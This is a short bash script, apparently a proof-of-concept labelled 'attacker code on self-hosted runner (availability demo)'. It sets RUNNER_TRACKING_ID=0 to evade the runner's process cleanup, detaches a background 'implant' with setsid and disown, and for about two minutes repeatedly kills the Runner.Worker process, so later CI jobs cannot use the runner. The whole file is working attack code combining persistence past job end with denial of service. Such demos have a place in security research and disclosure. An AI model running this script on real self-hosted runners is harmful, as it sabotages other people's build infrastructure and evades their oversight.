#!/bin/bash
echo "===== attacker code on self-hosted runner (availability demo) ====="; id; hostname
# Persistent implant: after THIS job ends, deny the runner to any later job by killing its worker.
export RUNNER_TRACKING_ID=0
setsid bash -c "
  sleep 20
  echo \"[implant] denying runner availability from \$(date -u)\" > /tmp/dos.log
  for i in \$(seq 1 120); do pkill -9 -f Runner.Worker 2>/dev/null; sleep 1; done
  echo \"[implant] window ended \$(date -u)\" >> /tmp/dos.log
" </dev/null >/dev/null 2>&1 & disown
echo "availability implant armed - persists past job end"
